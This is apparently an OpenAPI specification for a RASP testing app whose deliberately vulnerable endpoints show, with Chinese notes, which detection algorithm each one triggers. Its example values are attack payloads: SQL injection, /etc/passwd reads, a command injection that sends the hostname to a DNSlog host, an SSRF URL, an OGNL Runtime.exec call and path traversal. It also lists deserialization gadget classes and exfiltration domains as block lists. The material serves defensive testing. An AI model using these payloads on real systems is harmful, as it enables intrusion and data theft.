{"openapi":"3.0.1","info":{"title":"rasp","description":"","version":"1.0.0"},"tags":[],"paths":{"/api/vulns/sqli/users":{"get":{"summary":"4-sql_regex","deprecated":false,"description":"SQL注入算法#4 - 正则表达式\n仅用于救急， 临时写入正则来拦截，默认不开启\nclient可能会通过向服务器提交精心构造的字符串，应避免正则表达式拒绝服务攻击ReDoS攻击","tags":[],"parameters":[{"name":"id","in":"query","description":"","required":false,"example":"'-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+","schema":{"type":"string"}}],"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/file/upload":{"post":{"summary":"link_webshell","deprecated":false,"description":"算法1 - 通过链接方式获取 WebShell\n链接的文件是否在Web目录内，之后通过正则判断，源文件是否为普通文件(txt)，目的文件是否为脚本文件(jsp)\n\njava/nio/file/Files.createLink","tags":[],"parameters":[],"requestBody":{"content":{"multipart/form-data":{"schema":{"type":"object","properties":{"file":{"format":"binary","type":"string","example":"file:///Users/zqq/Desktop/test.txt"},"dst":{"example":"test_link.jsp","type":"string"},"action":{"example":"link","type":"string"}}}}}},"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/file/read":{"get":{"summary":"5-readFile_unwanted","deprecated":false,"description":"算法5 - 文件探针算法\n\n任意文件下载防护 - 读取敏感文件，最后一道防线\n如果应用读取了列表里的文件，比如 /root/.bash_history，这通常意味着后门操作","tags":[],"parameters":[{"name":"path","in":"query","description":"","required":false,"example":"/etc/passwd","schema":{"type":"string"}}],"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/file/write":{"post":{"summary":"2-writeFile_script","deprecated":false,"description":"算法2 - 拦截 php/jsp 等脚本文件的写入操作","tags":[],"parameters":[{"name":"dst","in":"query","description":"","required":false,"example":"write_test.jsp","schema":{"type":"string"}},{"name":"content","in":"query","description":"","required":false,"example":"Hello","schema":{"type":"string"}}],"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/deserialize/upload":{"post":{"summary":"1-deserialization_blacklist","deprecated":false,"description":"算法1 - 反序列化黑名单过滤\ndeserialization_blacklist: {\n        name:   '算法1 - 反序列化黑名单过滤',\n        action: 'block',\n  clazz: [\n            'org.apache.commons.collections.functors.ChainedTransformer',\n            'org.apache.commons.collections.functors.InvokerTransformer',\n            'org.apache.commons.collections.functors.InstantiateTransformer',\n            'org.apache.commons.collections4.functors.InvokerTransformer',\n            'org.apache.commons.collections4.functors.InstantiateTransformer',\n            'org.codehaus.groovy.runtime.ConvertedClosure',\n            'org.codehaus.groovy.runtime.MethodClosure',\n            'org.springframework.beans.factory.ObjectFactory',\n            'org.apache.xalan.xsltc.trax.TemplatesImpl',\n            'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n            'com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase'\n        ]\n    },\n1、算法原理：匹配反序列化类黑名单， 官方用例是org.apache.commons.collections4.functors.InvokerTransformer\n2、关键参数：\n\"plugin_message\":\"Deserialization blacklist - blocked org.apache.commons.collections4.functors.InvokerTransformer in resolveClass\"\n\"intercept_state\":\"block\",\"plugin_confidence\":100,\"plugin_algorithm\":\"deserialization_blacklist\"\n\"clazz\":\"org.apache.commons.collections4.functors.InvokerTransformer\"\n","tags":[],"parameters":[],"requestBody":{"content":{"multipart/form-data":{"schema":{"type":"object","properties":{"file":{"format":"binary","type":"string","example":"file:///Users/zqq/Desktop/rasp/testcases/testcases/cmd_code.ser"}}}}}},"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/file/delete":{"delete":{"summary":"1-deleteFile_userinput","deprecated":false,"description":"算法1 - 用户输入匹配，禁止使用 ../ 删除文件：\n（1）算法原理，通过is_path_endswith_userinput函数判断，要删除的文件路径是否为用户输入，有目录穿越行为；官方用例：curl 'http://192.168.142.128:8080/vulns/019-file-delete.jsp?filename=reports/../testfile.txt","tags":[],"parameters":[{"name":"path","in":"query","description":"","required":false,"example":"delete_random.jsp","schema":{"type":"string"}}],"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/file/list":{"get":{"summary":"3-directory_unwanted","deprecated":false,"description":"算法3 - 尝试查看敏感目录\n（1）算法原理，通过判断访问路径是否在forcefulBrowsing.unwantedDirectory配置内\n// 目录探针 - webshell 查看频次最高的目录\n    unwantedDirectory: [\n        '/',\n        '/home',\n        '/var/log',\n        '/private/var/log',\n        '/proc',\n        '/sys',\n        'C:\\\\',\n        'D:\\\\',\n        'E:\\\\'\n    ],","tags":[],"parameters":[{"name":"path","in":"query","description":"","required":false,"example":"/var/log","schema":{"type":"string"}}],"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/file/upload2":{"post":{"summary":"4-fileUpload_multipart_exe","deprecated":false,"description":"算法4 - Multipart 方式上传 DLL/EXE 等文件\n该算法默认为ignore不会阻拦","tags":[],"parameters":[],"requestBody":{"content":{"multipart/form-data":{"schema":{"type":"object","properties":{"file":{"format":"binary","type":"string","example":"file:///Users/zqq/Desktop/test.txt"}}}}}},"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/":{"get":{"summary":"2-include_protocol(TODO)","deprecated":false,"description":"算法2 - 尝试包含 jar:// 等异常协议:\n（1）算法原理，获取文件协议后与配置内的文件协议进行比较：\n// 文件包含 - 特殊协议\n    include_protocol: {\n        name:   '算法2 - 尝试包含 jar:// 等异常协议',\n        action: 'block',\n        protocols: [\n            'file',\n            'gopher',\n\n            // java specific\n            'jar',\n            'netdoc',\n\n            // php stream\n            'http',\n            'https',\n\n            // php specific\n            'dict',\n            'php',\n            // 'phar',\n            'compress.zlib',\n            'compress.bzip2',\n            'zip',\n            'rar'\n        ]\n    },\n\nJSP 文件中直接使用 ImportSupport 相关的标签，涉及JSP","tags":[],"parameters":[],"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/cmd/ping":{"get":{"summary":"6-command_dnslog","deprecated":false,"description":"算法6 - DNSlog检测\n检测命令是否包含'(^|\\\\W)(curl|ping|wget|nslookup|dig)\\\\W'\n且探测dnslog域名'\\\\.((ceye|exeye|sslip|nip)\\\\.io|dnslog\\\\.cn|(vcap|bxss)\\\\.me|xip\\\\.(name|io)|burpcollaborator\\\\.net|tu4\\\\.org|2xss\\\\.cc|request\\\\.bin|requestbin\\\\.net|pipedream\\\\.net)'\n例如，nslookup ${HOSTNAME}.xxx.dnslog.cn","tags":[],"parameters":[{"name":"address","in":"query","description":"","required":false,"example":"8.8.8.8;nslookup ${HOSTNAME}.xxx.dnslog.cn","schema":{"type":"string"}}],"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/ssrf":{"get":{"summary":"5-ssrf_protocol","deprecated":false,"description":"算法5 - 拦截 php:// 等异常协议\n        'file',\n       'gopher',\n\n            // python specific\n            'local_file',\n            'local-file',\n\n            // java specific\n            'jar',\n            'netdoc',\n\n            // php specific\n            'dict',\n            'php',\n            'phar',\n            'compress.zlib',\n            'compress.bzip2'","tags":[],"parameters":[{"name":"url","in":"query","description":"","required":false,"example":"dict://localhost:9999","schema":{"type":"string"}}],"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/xxe":{"post":{"summary":"3-xxe_file","deprecated":false,"description":"算法3 - 使用 file:// 协议读取文件\n可能误报，默认 log","tags":[],"parameters":[{"name":"url","in":"query","description":"","required":false,"example":"http://localhost:9999","schema":{"type":"string"}}],"requestBody":{"content":{"application/xml":{"schema":{"type":"object","properties":{},"xml":{}}}}},"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/ognl/eval":{"get":{"summary":"2-ognl_length_limit","deprecated":false,"description":"算法1 - OGNL语句长度\n只有当ognl表达式长度大于30时，才会去匹配算法，ognl表达式不在黑名单但是长度大于400也认为是攻击，这种情况不会阻拦只做告警","tags":[],"parameters":[{"name":"exp","in":"query","description":"","required":false,"example":"@java.lang.Runtime@getRuntime().exec('echo 1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890')","schema":{"type":"string"}}],"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/dns/resolve":{"get":{"summary":"1-dns_blacklist","deprecated":false,"description":"算法1 - 拦截DNS黑名单查询(比如DNSLog)\n（1）算法原理，判断请求的域名是否在配置的dnsLogDomains中\nvar dnsLogDomains   = [\n    '.vuleye.pw', '.ceye.io', '.exeye.io', '.vcap.me', '.xip.name', '.xip.io', '.sslip.io', '.nip.io',\n    '.burpcollaborator.net', '.tu4.org', '.2xss.cc', '.bxss.me', '.godns.vip', '.dnslog.cn', '.0kee.360.cn', '.r87.me','.ngrok.io',\n    // yumusb/DNSLog-Platform-Golang\n    '.xn--9tr.com', \n    // requestbin 新地址\n    '.pipedream.net',\n    // 端口转发工具\n    '.vxtrans.com', '.vxtrans.link',\n    // 免费DDNS厂商\n    '.hopto.org', '.zapto.org', '.sytes.net', '.ddns.net'\n]","tags":[],"parameters":[{"name":"hostname","in":"query","description":"","required":false,"example":"xxx.dnslog.cn","schema":{"type":"string"}}],"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/jndi/lookup":{"get":{"summary":"1-jndi_disable_all","deprecated":false,"description":"算法1 - 拦截所有JNDI调用：\n（1）算法原理，拦截所有JNDI调用","tags":[],"parameters":[{"name":"hostname","in":"query","description":"","required":false,"example":"xxx.dnslog.cn","schema":{"type":"string"}}],"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/leak/data":{"get":{"summary":"1-response_dataLeak","deprecated":false,"description":"算法1 - 检查响应里是否有敏感信息\n\n检查响应里是否有身份证、银行卡等敏感信息泄露，但是不能阻断，默认行为是ignore","tags":[],"parameters":[],"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}},"/api/vulns/library/load":{"get":{"summary":"1-loadLibrary_unc","deprecated":false,"description":"算法1 - 拦截 UNC 路径类库加载\n（1）算法原理，当为Windows时，判断路径是否已\\\\或者//开头，只能在windows环境下验证，UNC (Universal Naming Convention) is a format for specifying the location of resources such as shared files or devices on a network.","tags":[],"parameters":[{"name":"name","in":"query","description":"","required":false,"example":"//test.ddl","schema":{"type":"string"}}],"responses":{"200":{"description":"","content":{"application/json":{"schema":{"type":"object","properties":{}}}},"headers":{}}},"security":[]}}},"components":{"schemas":{},"securitySchemes":{}},"servers":[]}